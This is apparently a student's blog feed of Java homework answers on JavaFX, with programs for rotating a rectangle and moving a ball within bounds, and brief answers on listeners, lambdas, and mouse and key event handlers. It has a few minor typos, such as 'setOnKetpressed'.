<img src="/images/posts/piiYo0s.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/10/19/piiYo0s.png'">
<h2 id="旋转一个四边形请写一个程序在rotate-按钮被单击时将一个四边形向右旋转15度"><a class="markdownIt-Anchor" href="#旋转一个四边形请写一个程序在rotate-按钮被单击时将一个四边形向右旋转15度"></a> （旋转一个四边形）请写一个程序，在Rotate 按钮被单击时，将一个四边形向右旋转15度</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>application<span class="token punctuation">.</span></span><span class="token class-name">Application</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>geometry<span class="token punctuation">.</span></span><span class="token class-name">Pos</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Scene</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>control<span class="token punctuation">.</span></span><span class="token class-name">Button</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">HBox</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">VBox</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>shape<span class="token punctuation">.</span></span><span class="token class-name">Rectangle</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>stage<span class="token punctuation">.</span></span><span class="token class-name">Stage</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RotatingRectangle</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span> <span class="token punctuation">{</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> primaryStage<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token class-name">Rectangle</span> rec <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Rectangle</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">162</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        rec<span class="token punctuation">.</span><span class="token function">setStyle</span><span class="token punctuation">(</span><span class="token string">"-fx-fill: white; -fx-stroke: black;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 黑色画线，白色填充</span>
        <span class="token class-name">Button</span> rotateButton <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"Rotate"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        rotateButton<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token comment">// 在原有角度的基础上旋转15度</span>
            rec<span class="token punctuation">.</span><span class="token function">setRotate</span><span class="token punctuation">(</span>rec<span class="token punctuation">.</span><span class="token function">getRotate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">VBox</span> vBox <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VBox</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 防止矩形被按钮覆盖</span>
        vBox<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>rec<span class="token punctuation">,</span> rotateButton<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">HBox</span> hBox <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HBox</span><span class="token punctuation">(</span>vBox<span class="token punctuation">)</span><span class="token punctuation">;</span>

        vBox<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span><span class="token class-name">Pos</span><span class="token punctuation">.</span><span class="token constant">CENTER</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hBox<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span><span class="token class-name">Pos</span><span class="token punctuation">.</span><span class="token constant">CENTER</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span>hBox<span class="token punctuation">,</span> <span class="token number">486</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setTitle</span><span class="token punctuation">(</span><span class="token string">"RotatingRectangle"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<img src="/images/posts/piiY4XQ.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/10/19/piiY4XQ.png'">
<h2 id="移动小球编写一个程序在面板上移动小球-应该定义一个面板类来显示小球并提供向左-向右-向上和向下移动小球的方法-请进行边界检査以防止球完全移到视线之外"><a class="markdownIt-Anchor" href="#移动小球编写一个程序在面板上移动小球-应该定义一个面板类来显示小球并提供向左-向右-向上和向下移动小球的方法-请进行边界检査以防止球完全移到视线之外"></a> （移动小球）编写一个程序，在面板上移动小球。应该定义一个面板类来显示小球，并提供向左、向右、向上和向下移动小球的方法。请进行边界检査以防止球完全移到视线之外</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>application<span class="token punctuation">.</span></span><span class="token class-name">Application</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>geometry<span class="token punctuation">.</span></span><span class="token class-name">Pos</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Node</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Scene</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>control<span class="token punctuation">.</span></span><span class="token class-name">Button</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">HBox</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">VBox</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>shape<span class="token punctuation">.</span></span><span class="token class-name">Circle</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>stage<span class="token punctuation">.</span></span><span class="token class-name">Stage</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MoveBall</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span> <span class="token punctuation">{</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> primaryStage<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token class-name">Button</span> leftBtn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"Left"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Button</span> rightBtn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"Right"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Button</span> upBtn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"Up"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Button</span> downBtn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"Down"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Circle</span> circle <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Circle</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        circle<span class="token punctuation">.</span><span class="token function">setStyle</span><span class="token punctuation">(</span><span class="token string">"-fx-fill: white; -fx-stroke: black;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 黑色画线，白色填充</span>

        <span class="token class-name">HBox</span> hBox <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HBox</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">VBox</span> vBox <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VBox</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        hBox<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>leftBtn<span class="token punctuation">,</span> rightBtn<span class="token punctuation">,</span> upBtn<span class="token punctuation">,</span> downBtn<span class="token punctuation">)</span><span class="token punctuation">;</span>
        vBox<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>circle<span class="token punctuation">,</span> hBox<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// vBox.setAlignment(Pos.CENTER);</span>
        hBox<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span><span class="token class-name">Pos</span><span class="token punctuation">.</span><span class="token constant">CENTER</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span>vBox<span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        leftBtn<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token function">moveNodeWithinBounds</span><span class="token punctuation">(</span>circle<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> scene<span class="token punctuation">.</span><span class="token function">getWidth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> scene<span class="token punctuation">.</span><span class="token function">getHeight</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        rightBtn<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token function">moveNodeWithinBounds</span><span class="token punctuation">(</span>circle<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> scene<span class="token punctuation">.</span><span class="token function">getWidth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> scene<span class="token punctuation">.</span><span class="token function">getHeight</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        upBtn<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token function">moveNodeWithinBounds</span><span class="token punctuation">(</span>circle<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">,</span> scene<span class="token punctuation">.</span><span class="token function">getWidth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> scene<span class="token punctuation">.</span><span class="token function">getHeight</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        downBtn<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token function">moveNodeWithinBounds</span><span class="token punctuation">(</span>circle<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> scene<span class="token punctuation">.</span><span class="token function">getWidth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> scene<span class="token punctuation">.</span><span class="token function">getHeight</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        primaryStage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setTitle</span><span class="token punctuation">(</span><span class="token string">"Rotating Rectangle"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">moveNodeWithinBounds</span><span class="token punctuation">(</span><span class="token class-name">Node</span> node<span class="token punctuation">,</span> <span class="token keyword">double</span> dx<span class="token punctuation">,</span> <span class="token keyword">double</span> dy<span class="token punctuation">,</span> <span class="token keyword">double</span> sceneWidth<span class="token punctuation">,</span> <span class="token keyword">double</span> sceneHeight<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">double</span> newX <span class="token operator">=</span> node<span class="token punctuation">.</span><span class="token function">getTranslateX</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> dx<span class="token punctuation">;</span>
        <span class="token keyword">double</span> newY <span class="token operator">=</span> node<span class="token punctuation">.</span><span class="token function">getTranslateY</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> dy<span class="token punctuation">;</span>

        <span class="token keyword">double</span> nodeWidth <span class="token operator">=</span> node<span class="token punctuation">.</span><span class="token function">getBoundsInParent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getWidth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">double</span> nodeHeight <span class="token operator">=</span> node<span class="token punctuation">.</span><span class="token function">getBoundsInParent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getHeight</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>newX <span class="token operator">+</span> nodeWidth <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> newX <span class="token operator">&lt;</span> sceneWidth<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            node<span class="token punctuation">.</span><span class="token function">setTranslateX</span><span class="token punctuation">(</span>newX<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>newY <span class="token operator">+</span> nodeHeight <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> newY <span class="token operator">&lt;</span> sceneHeight<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            node<span class="token punctuation">.</span><span class="token function">setTranslateY</span><span class="token punctuation">(</span>newY<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<img src="/images/posts/piiYImj.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/10/19/piiYImj.png'">
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>作业</tag>
      </tags>
  </entry>
  <entry>
    <title>Java作业-6</title>
    <url>/2023/10/26/06-10-32/</url>
    <content><![CDATA[<p>JavaFx相关</p>
<span id="more"></span>
<h2 id="一个-observable-类的实例被认为是一个可观察对象如何添加一个监听器监听器必须实现什么接口"><a class="markdownIt-Anchor" href="#一个-observable-类的实例被认为是一个可观察对象如何添加一个监听器监听器必须实现什么接口"></a> 一个 Observable 类的实例被认为是一个可观察对象,如何添加一个监听器？监听器必须实现什么接口？</h2>
<p>实现<code>InvalidationListener</code>接口以重写<code>invalidated(Observable o)</code></p>
<ul>
<li>解耦监听器与Observable：尽量让监听器与被观察的对象解耦，以便于维护和扩展。</li>
<li>避免在ChangeListener内部修改Observable值：这可能导致不可预见的行为。</li>
<li>小心内存泄漏：如果你添加了一个监听器但之后没有从Observable对象中移除它，可能会导致内存泄漏。</li>
</ul>
<h2 id="什么是功能接口为什么对于一个-lambda-表达式而言必须是一个功能接口"><a class="markdownIt-Anchor" href="#什么是功能接口为什么对于一个-lambda-表达式而言必须是一个功能接口"></a> 什么是功能接口？为什么对于一个 lambda 表达式而言，必须是一个功能接口？</h2>
<p>一个功能接口（Functional Interface）是具有单一抽象方法（SAM, Single Abstract Method）的接口。这意味着接口中只能有一个没有实现的方法。这种接口可以有多个带有默认或静态实现的方法，但只能有一个抽象方法。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@FunctionalInterface</span>  <span class="token comment">// 注解是可选的，但是有助于编译器检查</span>
<span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">MyFunctionalInterface</span> <span class="token punctuation">{</span>
    <span class="token keyword">void</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>Lambda 表达式的主要目的是提供一种简洁、可读的方式来表示实例化一个单一方法的接口。因为 Lambda 表达式旨在提供一种简单的方式来实现一个方法，所以它自然地适用于具有单一抽象方法的接口。如果接口有多于一个的抽象方法，编译器将无法确定该实现哪一个，这会导致歧义。</p>
<h2 id="对于一个鼠标按下-释放-单击-进入-退出-移动和拖动事件使用什么方法来注册一个相应的处理器"><a class="markdownIt-Anchor" href="#对于一个鼠标按下-释放-单击-进入-退出-移动和拖动事件使用什么方法来注册一个相应的处理器"></a> 对于一个鼠标按下、释放、单击、进入、退出、移动和拖动事件，使用什么方法来注册一个相应的处理器？</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">rectangle<span class="token punctuation">.</span><span class="token function">setOnMousePressed</span><span class="token punctuation">(</span>event <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Mouse pressed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

rectangle<span class="token punctuation">.</span><span class="token function">setOnMouseReleased</span><span class="token punctuation">(</span>event <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Mouse released"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

rectangle<span class="token punctuation">.</span><span class="token function">setOnMouseClicked</span><span class="token punctuation">(</span>event <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Mouse clicked"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

rectangle<span class="token punctuation">.</span><span class="token function">setOnMouseEntered</span><span class="token punctuation">(</span>event <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Mouse entered"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

rectangle<span class="token punctuation">.</span><span class="token function">setOnMouseExited</span><span class="token punctuation">(</span>event <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Mouse exited"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

rectangle<span class="token punctuation">.</span><span class="token function">setOnMouseMoved</span><span class="token punctuation">(</span>event <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Mouse moved"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

rectangle<span class="token punctuation">.</span><span class="token function">setOnMouseDragged</span><span class="token punctuation">(</span>event <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Mouse dragged"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="使用什么方法来针对键的按下-释放以及敲击事件注册处理器这些方法定义在哪些类中"><a class="markdownIt-Anchor" href="#使用什么方法来针对键的按下-释放以及敲击事件注册处理器这些方法定义在哪些类中"></a> 使用什么方法来针对键的按下、释放以及敲击事件注册处理器？这些方法定义在哪些类中？</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">node<span class="token punctuation">.</span><span class="token function">setOnKetpressed</span><span class="token punctuation">(</span>event <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Pressed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
node<span class="token punctuation">.</span><span class="token function">setOnKeyReleased</span><span class="token punctuation">(</span>event <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Release"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
node<span class="token punctuation">.</span><span class="token function">setOnKeyTyped</span><span class="token punctuation">(</span>event <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Typed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>定义在<code>javafx.scene.Node</code>类中，因此所有继承自<code>Node</code>的类（如<code>Control</code>，<code>Shape</code>，<code>Text</code>等）都可以使用这些方法。</p>
<h2 id="创建一个簡单的计算器-编写一个程序完成加法-减法-乘法和除法操作"><a class="markdownIt-Anchor" href="#创建一个簡单的计算器-编写一个程序完成加法-减法-乘法和除法操作"></a> (创建一个簡单的计算器) 编写一个程序完成加法、减法、乘法和除法操作</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>application<span class="token punctuation">.</span></span><span class="token class-name">Application</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>geometry<span class="token punctuation">.</span></span><span class="token class-name">Pos</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Scene</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>control<span class="token punctuation">.</span></span><span class="token class-name">Button</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>control<span class="token punctuation">.</span></span><span class="token class-name">TextField</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">BorderPane</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">HBox</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>paint<span class="token punctuation">.</span></span><span class="token class-name">Color</span></span><span class="token punctuation">;</span>
